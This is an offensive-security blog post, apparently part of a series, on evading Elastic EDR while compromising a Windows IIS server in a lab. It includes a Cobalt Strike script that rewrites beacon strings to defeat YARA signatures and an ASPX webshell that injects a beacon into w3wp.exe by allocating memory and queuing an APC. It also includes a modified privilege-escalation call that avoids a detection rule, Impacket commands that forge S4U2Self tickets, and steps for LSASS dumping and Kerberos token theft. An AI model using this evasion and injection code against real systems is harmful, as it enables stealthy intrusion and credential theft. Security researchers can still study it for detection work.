---
title: Increase your stealth capabilities - part 2
date: 2024-01-04
categories: [ "Malware Development" ]
tags: [ "research", "command and control", "windows", "edr", "tooling", "detection", "elastic" ]     # TAG names should always be lowercase
---

***Note:*** This blog post is the second one of the series *Increase your stealth capabilities*, make sure to have read [the first part](/posts/increase-stealth-capabilities-part1/).

## Recap

During an engagement my teammates and I compromised a Windows server by uploading a webshell then elevated our privilege to SYSTEM and extracted credentials stored in LSASS.
In Part 1, I replayed the scenario in a lab where an Elastic EDR agent is running and we noticed that a lot of detection raised up.
In this Part 2, I will show how we can increase our stealth capabilities by using open source tools and building our own.

## Cobalt Strike modifications

In order to evade Elastic EDR yara rules, I followed the following Fortra [blog post](https://www.cobaltstrike.com/blog/cobalt-strike-and-yara-can-i-have-your-signature).

Yara rules are pretty easy to evade when you know them… Elastic EDR rules can be found [here](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_CobaltStrike.yar).

I used [xforcered/BokuLoader](https://github.com/xforcered/BokuLoader) (October+ release) to increase evasion capabilities of the Cobalt Strike beacon. This release contains call stack spoofing capabilities that bypass Elastic EDR rules based on call stack analysis. You can learn more about it [here](https://dtsec.us/2023-09-15-StackSpoofin/).

After the User-Defined Reflective Loader included in Cobalt Strike, I made the following changes to the `bokuloader.cna` to bypass Elastic EDR yara rules:

```perl
sub boku_strrep {
	local('$beacon_dll');
	$beacon_dll = $1;
	$beacon_dll = strrep($beacon_dll, "ReflectiveLoader", "__BokuLo4d3r____");
	$beacon_dll = strrep($beacon_dll, "Microsoft Base Cryptographic Provider v1.0", "13367321236742382543232341241261363163151d");
	$beacon_dll = strrep($beacon_dll, "(admin)", "(2omin)");
	$beacon_dll = strrep($beacon_dll, "beacon", "b4con5");
	$beacon_dll = strrep($beacon_dll, "%s as %s\\%s: %d", "%s -> %s\\%s: %d");
	$beacon_dll = strrep($beacon_dll, "%02d/%02d/%02d %02d:%02d:%02d", "%02d/%02d/%02d>%02d:%02d:%02d");
	$beacon_dll = strrep($beacon_dll, "This program cannot be run in DOS mode", "13367321236742383543232341221261363163");
	println("DEBUG - change DOS stub");
	$beacon_dll = strrep($beacon_dll, "\x4D\x5A\x41\x52\x55\x48\x89\xE5", "\x4D\x5A\x41\x52\x55\x48\x89\xE5\x90");
	return $beacon_dll;
}
```

At this point, Elastic EDR should not detect the Cobalt Strike Reflective DLL as `Windows.Trojan.CobaltStrike`.

However, Elastic EDR will still alert if malicious bahaviour is detected:

- Access to LSASS process from unbacked memory
- DLL loading from unbacked memory
- …

Now we have a stealthier beacon, we can start to compromise the Windows server. 

## Webshell

As the goal is to get a proper access to the Windows machine, I will try to get a CobaltStrike beacon without executing OS command.

To do so, I crafted a C# web page which will inject the Cobalt Strike beacon into the current IIS process `w3wp.exe`.

```c#
<%@ Page Language="c#"%>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Threading.Tasks" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Collections.Generic" %>
<%@ Import Namespace="System.Linq" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>

<script runat="server">

    /*
	    Flags and functions import
	    ...
    */

    
    public string ServerSideFunction()
    {
       
        byte[] data = new byte[REPLACE_ME] { REPLACE_ME };

        IntPtr pHandle = (IntPtr)(-1);
        if (pHandle == IntPtr.Zero)
            return "OpenProcess failed " + Marshal.GetLastWin32Error();
        IntPtr addr = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)data.Length, AllocationType.Commit, AllocationProtect.PAGE_READONLY);
        if (addr == IntPtr.Zero)
            return "VirtualAllocEx failed";
        
        uint lpflOldProtect = 0;
        bool res = false;

        res = VirtualProtectEx(pHandle, addr, (uint)data.Length, 0x00000004, out lpflOldProtect);
        if (res == false)
            return "VirtualProtectEx RW failed";
        IntPtr sc = Marshal.AllocHGlobal(data.Length);
        if (sc == IntPtr.Zero)
            return "AllocHGlobal failed";
        RtlZeroMemory(sc, data.Length);

        UInt32 getsize = 0;
        NTSTATUS ntstatus = NtWriteVirtualMemory(pHandle, addr, data, (uint)data.Length, ref getsize);
        if (getsize == 0)
            return "NtWriteVirtualMemory failed";
        
        res = VirtualProtectEx(pHandle, addr, (uint)data.Length, 0x00000020, out lpflOldProtect);
        if (res == false)
            return "VirtualProtectEx RX failed";
        IntPtr Thread_id = IntPtr.Zero;
        IntPtr tHandle = CreateRemoteThread(
            pHandle, 
            IntPtr.Zero, 
            0, 
            (IntPtr)0xfff,
            IntPtr.Zero, 
            (uint)CreationFlags.CREATE_SUSPENDED, 
            out Thread_id);

        QueueUserAPC(addr, tHandle, 0);
        ResumeThread(tHandle);
        CloseHandle(pHandle);
        CloseHandle(tHandle);
	return "OK";

    }
</script>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252" />
<title>ASP.NET inline</title>
</head>
<body>
<% =ServerSideFunction() %>
</body>
</html>
```

Which does:

1. Get an handle on the current process
2. Allocate RW memory in the process
3. Write the beacon to this memory region
4. Change the memory permissions to RX
5. Call the beacon through APC

When the page is being called, we got our beacon back.

![](/assets/posts/2024-01-04-increase-stealth-capabilities-part2/initial-cs.png)

And I got zero detection from Elastic EDR for this step.

## Privilege escalation

Now we have a beacon as a local service account we may want to escalate our privilege to dump some credentials.

I’m aware of 2 ways to perform the privilege escalation:

- abuse `SeImpersonateToken` privilege with a Potato family exploit
- abuse `S4U2Self` Kerberos to forge a Service Ticket on behalf of a domain user who has local admin right

Both methods can be used:

- Potato exploits trigger a SYSTEM call and impersonate the local account - this might be detected (~~I don’t know if some AV/EDR have detection rules for thisI recently noticed Elastic EDR has a rule for this~~). This method works on both no domain joined and joined Windows machine.
- S4USelf method is very stealthy as it only uses Kerberos but it is not usable in a no domain-joined machine and we might need PSRemoting/WinRM to be enabled as we don’t want to use psexec/smbexec/wmiexec/… which will raise security alerts.


Actually there is an universal privilege escalation path when LDAP signature is not enforced on domain controllers (default configuration) but I will make a dedicated blog post on this one later.

## Privilege escalation - SeImpersonatePrivilege

Few months ago, [Prepouce/CoercedPotato](https://github.com/Prepouce/CoercedPotato) was released. CoercedPotato is a C++ program which, like the other Potato exploits, spawn a named pipe (via a RPC interface) to receive a SYSTEM authentication and impersonate it. To coerce the SYSTEM auth, CoercedPotato use MS-EFSR and MS-RPRN functions.

As we don’t want to put and execute anything on the disk, I forked and “converted” CoercedPotato to a Reflective DLL [sokaRepo/CoercedPotatoRDLL](https://github.com/sokaRepo/CoercedPotatoRDLL). You can read about it in a previous [blog post](/posts/create-reflective-dll-cobalt-strike/).


When I tested the Reflective DLL, I had the surprise that Elastic EDR recently added a Malicious Bahaviour Detection rule that didn’t exist one or two months before… =)

![](/assets/posts/2024-01-04-increase-stealth-capabilities-part2/alert-privesc.png)

I though that the detection could be based on:

- use of known “malicious” functions `CreateProcessAsUser`/`CreateProcessWithTokenW`
- behavior: a process which runs as a local service spawns a process as SYSTEM

If we look at what `CreateProcessAsUser` is doing in IDA:

![](/assets/posts/2024-01-04-increase-stealth-capabilities-part2/ida.png)

The function just forwards the arguments to `CreateProcessInternalW` from `KernelBase.dll`. We can use it in the CoercedPotatoRDLL code:

```c
typedef BOOL(WINAPI* fnCreateProcessInternalW)(
	HANDLE,
	LPCWSTR,
	LPWSTR,
	LPSECURITY_ATTRIBUTES,
	LPSECURITY_ATTRIBUTES,
	BOOL,
	DWORD,
	LPVOID,
	LPCWSTR,
	LPSTARTUPINFOW,
	LPPROCESS_INFORMATION
);

fnCreateProcessInternalW CreateProcessInternalW; 

CreateProcessInternalW = (fnCreateProcessInternalW)GetProcAddress(
										GetModuleHandle(L"kernelbase.dll"),
										"CreateProcessInternalW"
										); 

if (!CreateProcessInternalW(hSystemTokenDup,
							g_pwszProcessName,
							g_pwszCommandLine,
							NULL,
							NULL,
							g_bInteractWithConsole,
							dwCreationFlags,
							lpEnvironment,
							pwszCurrentDirectory,
							&si,
							&pi)) 
	wprintf(L"CreateProcessInternalW failed, error = %d\n", GetLastError());
else
	wprintf(L"CreateProcessInternalW seems OK");

```

![](/assets/posts/2024-01-04-increase-stealth-capabilities-part2/coercedpotato.png)

With these modifications, Elastic EDR doesn’t alert about the privilege escalation anymore!

![](/assets/posts/2024-01-04-increase-stealth-capabilities-part2/system-cs.png)

## Privilege escalation - S4U2Self

Another way to do this is to abuse Kerberos itself. As a local service account, when we authenticate with NTLM or Kerberos on another machine, the domain machine account is used `WEB1$`. Therefore, the [tgtdeleg trick](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1) can be used to request a delegation TGT on behalf of the machine account.

![](/assets/posts/2024-01-04-increase-stealth-capabilities-part2/nanorubeus-cs.png)

Once we have it, we can abuse Kerberos S4U2Self to ask for Service Ticket that impersonates a domain user with local admin right on the machine.

Unfortunately, I did not succeed to perform this step with Cobalt Strike only so I used a SOCKS proxy and Impacket on my Linux VM.

```bash
> echo -n 'ticket...' | base64 -d > web1.kirbi
> ticketConverter.py web1.kirbi web1.ccache
> export KRB5CCACHE=web1.ccache
> git clone https://github.com/ThePorgs/impacket/
# install it
# carreful with SPN name, try lower case and upper case for "HTTP"
# I skipped the SOCKS proxy part here
> getST.py -self -impersonate "sadmin" -altservice "HTTP/web1.crash.lab" -k -no-pass -dc-ip 10.100.10.5 'crash.lab/web1$'
# use this to debug
> export KRB5_TRACE=/dev/stdout
> export KRB5CCNAME=sadmin@HTTP_web1.crash.lab@CRASH.LAB.ccache
# update /etc/krb5.conf if GSS error  
> evil-winrm.rb -i web1.crash.lab -r crash.lab
```

![](/assets/posts/2024-01-04-increase-stealth-capabilities-part2/evilwinrm.png)

And popup a beacon as local administrator (the `*` in `sadmin*` means the beacon runs in a high integrity context).

![](/assets/posts/2024-01-04-increase-stealth-capabilities-part2/admin-cs.png)

## LSASS credentials dumping

That’s the tricky part… It’s seems that when `Credentials hardening` is enabled, it is not possible to open an handle on LSASS.exe

![](/assets/posts/2024-01-04-increase-stealth-capabilities-part2/creds-hardening.png)

When we try to extract credentials with built-in Mimikatz command, it is not possible to access the process.

![](/assets/posts/2024-01-04-increase-stealth-capabilities-part2/logonpasswords-cs.png)

If we try to use [fortra/nanodump](https://github.com/fortra/nanodump), we have the same access issue.

![](/assets/posts/2024-01-04-increase-stealth-capabilities-part2/nanodump-failed-cs.png)

If we turn off the `Credentials hardening`, we can successfully dump LSASS process without any alert from Elastic EDR.

![](/assets/posts/2024-01-04-increase-stealth-capabilities-part2/nanodump-success-cs.png)

## Alternatives to LSASS dump

Alternatively we can enumerate TGT inside LSA and look for any interesting users (`sadmin` is a good candidate in my lab).

To perform the bellow Keberos interactions, I use [RalfHacker/Kerbeus-BOF](https://github.com/RalfHacker/Kerbeus-BOF) but [wavvs/nanorobeus](https://github.com/RalfHacker/Kerbeus-BOF) can also be used (Kerbeus-BOF is actually based on nanorobeus).

![](/assets/posts/2024-01-04-increase-stealth-capabilities-part2/triage-cs.png)

Here we dump all the TGT which belong to `sadmin` user.

![](/assets/posts/2024-01-04-increase-stealth-capabilities-part2/tgtdump-cs.png)

In case we don’t have any TGT valid anymore, we can look for processes which run under our targeted user.

![](/assets/posts/2024-01-04-increase-stealth-capabilities-part2/tasklist-cs.png)

Then steal the token of one of the processes.

![](/assets/posts/2024-01-04-increase-stealth-capabilities-part2/tokensteal-cs.png)

And use it to ask for a TGT

![](/assets/posts/2024-01-04-increase-stealth-capabilities-part2/tgtdeleg-cs.png)

![](/assets/posts/2024-01-04-increase-stealth-capabilities-part2/tgtdescribe-cs.png)

From here, we can act on behalf of `sadmin` user and try to move laterally in the network.

## Conclusion

In this second part we saw how we can increase our stealth and prevent Elastic EDR to spot us by using amazing open source tools such as BokuLoader.

To avoid executing .NET assembly in memory, we used C++ tool CoercedPotato and modify it to be a Reflective DLL in order to be able to load it in memory with Cobalt Strike.

For credentials dumping, we can use nanodump of Fortra to dump LSASS process to avoid detection. If we want to avoid touching LSASS, we shown how Kerberos tickets can be extracted or generated by stealing Windows tokens.